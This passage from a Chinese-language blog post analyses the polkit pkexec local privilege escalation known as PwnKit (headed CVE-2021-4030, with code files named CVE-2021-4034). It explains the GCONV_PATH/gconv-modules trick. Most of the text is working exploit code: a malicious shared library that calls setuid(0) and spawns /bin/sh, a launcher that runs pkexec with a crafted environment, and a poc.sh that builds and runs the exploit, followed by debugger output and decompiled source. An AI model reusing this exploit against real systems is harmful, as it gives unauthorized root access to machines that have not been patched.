<li>612行 argv[1]越界访问的是envp[0]，获取到value值，和path组合后写回；（实现了一次找到路径的写入）此时<code>GCONV_PATH</code>已经被篡改</li>
<li>检测到<code>SHELL</code>变量问题，调用<code>g_printerr</code></li>
<li>根据<code>CHARSET</code>变量，需要转码，调用<code>iconv</code>，然后<code>iconv_open</code></li>
<li>根据<code>GCONV_PATH</code>找到<code>gconv-modules</code>,然后找到我们的恶意库</li>
<li>调用函数<code>gonv_init()</code>,提权拿下！</li>
</ol>
<h2 id="GCONV-PATH漏洞demo"><a href="#GCONV-PATH漏洞demo" class="headerlink" title="GCONV_PATH漏洞demo"></a>GCONV_PATH漏洞demo</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file name hack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you be hacked alreadly!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export CHARSET=HACK</span><br><span class="line">export GCONV_PATH=.</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class="line">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure>

<p>这样就布置好了所有准备，然后手动调用<code>iconv</code>，虽然我想用<code>g_printerr</code>?但是编译不通？？<br>hacked！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class="line">you be hacked alreadly!</span><br><span class="line">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<h3 id="module语法"><a href="#module语法" class="headerlink" title="module语法"></a>module语法</h3><p><a target="_blank" rel="noopener" href="https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module AAAA// BBBB// name 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从 AAAA编码到 BBBB编码 根据name.so规则 消耗cast值为1</span></span><br></pre></td></tr></table></figure>

<p>然后<code>iconv</code>不知道<code>CHARSET</code>中的<code>HACK</code>是什么字符集，就会找到<code>GCONV_PATH</code>路径下的<code>gconv_modules</code>去找解码工具，然后就落入我们的恶意库了，所以能控制<code>GCONV_PATH</code>就能恶意代码执行</p>
<h2 id="分析POC"><a href="#分析POC" class="headerlink" title="分析POC"></a>分析POC</h2><h3 id="make做的事"><a href="#make做的事" class="headerlink" title="make做的事"></a>make做的事</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class="line">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class="line">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class="line">mkdir -p GCONV_PATH=.</span><br><span class="line">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure>

<p>先是在当前目录下生成了<code>pwnkit.so</code>的库<br>然后编译了<code>cve-2021-4034</code><br>然后传入一句话给<code>gconv-modules</code><br>创建一个文件夹，名字为<code>GCONV_PATH=.</code><br>最后cp<code>/usr/bin/true</code>到<code>GCONV_PATH=.</code>文件夹路径下的<code>pwnkit.so:.</code>里去<code>-f</code>是force强制把<code>/usr/bin/true</code>这个文件cp到目标路径，因为<code>pkexec</code>要执行<code>PATH</code>路径下的第一个参数，就必须让pkexec空执行，所以目标就被替换成<code>true</code>，怎么执行都不会出错<br>当前目录结构</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── cve-2021-4034.c</span><br><span class="line">├── cve-2021-4034.sh</span><br><span class="line">├── dry-run</span><br><span class="line">│   ├── dry-run-cve-2021-4034.c</span><br><span class="line">│   ├── Makefile</span><br><span class="line">│   └── pwnkit-dry-run.c</span><br><span class="line">├── LICENSE</span><br><span class="line">├── Makefile</span><br><span class="line">├── pwnkit.c</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>

<p>make之后的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── cve-2021-4034</span><br><span class="line">├── cve-2021-4034.c</span><br><span class="line">├── cve-2021-4034.sh</span><br><span class="line">├── dry-run</span><br><span class="line">│   ├── dry-run-cve-2021-4034.c</span><br><span class="line">│   ├── Makefile</span><br><span class="line">│   └── pwnkit-dry-run.c</span><br><span class="line">├── gconv-modules</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── pwnkit.so:.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── Makefile</span><br><span class="line">├── pwnkit.c</span><br><span class="line">├── pwnkit.so</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>

<h3 id="cve-2021-4034-c"><a href="#cve-2021-4034-c" class="headerlink" title="cve-2021-4034.c"></a>cve-2021-4034.c</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">	char * const args[] = &#123;</span><br><span class="line">		NULL</span><br><span class="line">	&#125;;</span><br><span class="line">	char * const environ[] = &#123;</span><br><span class="line">		&quot;pwnkit.so:.&quot;,</span><br><span class="line">		&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class="line">		&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class="line">		&quot;CHARSET=PWNKIT&quot;,</span><br><span class="line">		&quot;GIO_USE_VFS=&quot;,</span><br><span class="line">		NULL</span><br><span class="line">	&#125;;</span><br><span class="line">	return execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个环境变量指向<code>pwnkit.so:.</code>，拼接后就是<code>GCONV_PATH=./pwnkit.so:.</code><br><code>:</code>的作用我在网上都没查到很好的介绍，我理解为二级指针会遍历由<code>:</code>分割的路径，，，<br>也就是第二轮循环会变成<code>GCONV_PATH=.</code>，引导向当时的恶意库</p>
<h3 id="pwnkit-c"><a href="#pwnkit-c" class="headerlink" title="pwnkit.c"></a>pwnkit.c</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">(<span class="type">void</span> *step)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> args[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> environ[] = &#123; <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">execve</span>(args[<span class="number">0</span>], args, environ);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是伪造的<code>gconv-mudules</code>下的<code>so</code>文件，会执行<code>gconv</code>和<code>gconv_init</code><br>这个<code>PATH</code>就是多个可能的bin目标依次遍历<br>这就是shellcode了<br>关于这个<code>setuid</code>和<code>setgid</code>我重新开一章分析</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>既然自己分析完了，就要自己写利用脚本<br>首先是恶意库</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">(<span class="type">void</span> *step)</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> *<span class="type">const</span> args[]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *<span class="type">const</span> envp[]=&#123;</span><br><span class="line">		<span class="string">&quot;PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin:/opt/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">execve</span>(args[<span class="number">0</span>],args,envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用<code>args</code>的目的就是为了语句复用，没啥特别含义，也能拆成<code>/bin/sh</code>+<code>argv</code><br>pkexec执行的提权</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> *<span class="type">const</span> args[]=&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *<span class="type">const</span> environ[]=&#123;</span><br><span class="line">		<span class="string">&quot;evilib.so:.&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SHELL=/are/you/kid/me&quot;</span>,</span><br><span class="line">		<span class="string">&quot;CHARSET=HACK&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="built_in">execve</span>(<span class="string">&quot;/usr/bin/pkexec&quot;</span>,args,environ);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp exp.c</span><br><span class="line">mkdir GCONV_PATH=.</span><br><span class="line">gcc -fPIC -shared -o ./evilib.so evilib.c</span><br><span class="line">echo &quot;module UTF-8// HACK// evilib 1&quot; &gt; gconv-modules</span><br><span class="line">cp -f /usr/bin/true ./GCONV_PATH=./evilib.so:.</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

<h2 id="补充调试"><a href="#补充调试" class="headerlink" title="补充调试"></a>补充调试</h2><p><a target="_blank" rel="noopener" href="https://hub.docker.com/r/chenaotian/cve-2021-4034">https://hub.docker.com/r/chenaotian/cve-2021-4034</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b *$rebase(0x2380)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/image.png" alt="image"></p>
<p>两次结果对比</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02:0010│     0x7fffa507a720 —▸ 0x7fffa507bfad ◂— &#x27;pwnkitdir&#x27;</span><br><span class="line">03:0018│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class="line">04:0020│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class="line">05:0028│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rax 0x7fffa507a720 —▸ 0x55b966a37f50 ◂— &#x27;GCONV_PATH=./pwnkitdir&#x27;</span><br><span class="line">01:0008│     0x7fffa507a728 —▸ 0x7fffa507bfb7 ◂— &#x27;PATH=GCONV_PATH=.&#x27;</span><br><span class="line">02:0010│     0x7fffa507a730 —▸ 0x7fffa507bfc9 ◂— &#x27;CHARSET=PWNKIT&#x27;</span><br><span class="line">03:0018│     0x7fffa507a738 —▸ 0x7fffa507bfd8 ◂— &#x27;SHELL=xxx&#x27;</span><br></pre></td></tr></table></figure>

<p>ida审计到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( *v19 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    program_in_path = g_find_program_in_path(v19);</span><br><span class="line">    v21 = program_in_path;</span><br><span class="line">    <span class="keyword">if</span> ( program_in_path )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = v7;</span><br><span class="line">      v7 = (gchar *)program_in_path;</span><br><span class="line">      g_free(v22);</span><br><span class="line">      *(_QWORD *)opt_usera = v21; &lt;&lt;--------------------- argv[n] = path = s;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    v38 = v7;</span><br><span class="line">    v37 = strerror(<span class="number">2</span>);</span><br><span class="line">    v36 = <span class="string">&quot;Cannot run program %s: %s\n&quot;</span>;</span><br><span class="line">LABEL_55:</span><br><span class="line">    v8 = <span class="number">127</span>;</span><br></pre></td></tr></table></figure>

<p>根据字符串定位到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)g_strcmp0(type, <span class="string">&quot;SHELL&quot;</span>) )<span class="comment">// 获取到SHELL的环境变量</span></span><br><span class="line">      &#123;</span><br><span class="line">        v151 = <span class="number">0LL</span>;</span><br><span class="line">        v152[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)g_file_get_contents(<span class="string">&quot;/etc/shells&quot;</span>, &amp;v151, <span class="number">0LL</span>, v152) )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = <span class="number">0</span>;</span><br><span class="line">          v29 = g_strsplit(v151, <span class="string">&quot;\n&quot;</span>, <span class="number">0LL</span>);<span class="comment">//shells</span></span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;<span class="comment">// 如果终止条件满足</span></span><br><span class="line">            <span class="keyword">if</span> ( !v29 || (v30 = *(_QWORD *)(v29 + <span class="number">8LL</span> * v28)) == <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v31 = v29;</span><br><span class="line">              v6 = (<span class="type">const</span> <span class="type">char</span> **)subjecta;</span><br><span class="line">              v7 = local_agent_handle;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_47;<span class="comment">// 直接跳过去</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)g_strcmp0(v27, v30) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            ++v28;</span><br><span class="line">          &#125;</span><br><span class="line">          g_free(v151);</span><br><span class="line">          g_strfreev(v29);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = (<span class="type">const</span> <span class="type">char</span> **)subjecta;</span><br><span class="line">        v7 = local_agent_handle;</span><br><span class="line">        v31 = <span class="number">0LL</span>;</span><br><span class="line">        g_printerr(<span class="string">&quot;Error getting contents of /etc/shells: %s\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(v152[<span class="number">0</span>] + <span class="number">8</span>));</span><br><span class="line">        g_error_free(v152[<span class="number">0</span>]);</span><br><span class="line">LABEL_47:</span><br><span class="line">        g_free(v151);</span><br><span class="line">        g_strfreev(v31);</span><br><span class="line">        log_message(<span class="number">2</span>, <span class="number">1</span>, <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)g_file_get_contents(<span class="string">&quot;/etc/shells&quot;</span>, &amp;v151, <span class="number">0LL</span>, v152) )</span><br><span class="line">LABEL_48:</span><br><span class="line">        v32 = <span class="string">&quot;\nThis incident has been reported.\n&quot;</span>;</span><br><span class="line">LABEL_49:</span><br><span class="line">        v8 = <span class="number">127</span>;</span><br><span class="line">        g_printerr(v32);</span><br><span class="line">        g_free(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>

<p><code>v28</code>是idx，可以得知这是个数组<br>反馈到源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shells = g_strsplit (contents, <span class="string">&quot;\n&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; shells != <span class="literal">NULL</span> &amp;&amp; shells[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_strcmp0 (shell, shells[n]) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        ret = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在后面调用了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/* To qualify for the paranoia goldstar - we validate the value of each</span></span><br><span class="line"><span class="comment">       * environment variable passed through - this is to attempt to avoid</span></span><br><span class="line"><span class="comment">       * exploits in (potentially broken) programs launched via pkexec(1).</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!validate_environment_variable (key, value))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">然后里面又调用了---------------------------------------------------</span><br><span class="line">  <span class="comment">/* special case $SHELL */</span></span><br><span class="line">  <span class="keyword">if</span> (g_strcmp0 (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">      <span class="keyword">if</span> (!is_valid_shell (value))</span><br><span class="line">        &#123;</span><br><span class="line">          log_message (LOG_CRIT, TRUE,</span><br><span class="line">                       <span class="string">&quot;The value for the SHELL variable was not found in the /etc/shells file&quot;</span>);</span><br><span class="line">          g_printerr (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">  <span class="keyword">for</span> (n = <span class="number">0</span>; shells != <span class="literal">NULL</span> &amp;&amp; shells[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (g_strcmp0 (shell, shells[n]) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          ret = TRUE;</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  g_free (contents);</span><br><span class="line">  g_strfreev (shells);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" data-id="cl6np03tk0000eoveaay70i6y" data-title="CVE-2021-4030 polkit-pkexec 本地提权" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/08/10/test/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          test
        
      </div>
    </a>
  
  
    <a href="/2022/08/10/My-New-Post/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">My New Post</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/10/test/">test</a>
          </li>
        
          <li>
            <a href="/2022/08/10/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">CVE-2021-4030 polkit-pkexec 本地提权</a>
          </li>
        
          <li>
            <a href="/2022/08/10/My-New-Post/">My New Post</a>
          </li>
        
          <li>
            <a href="/2022/08/10/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>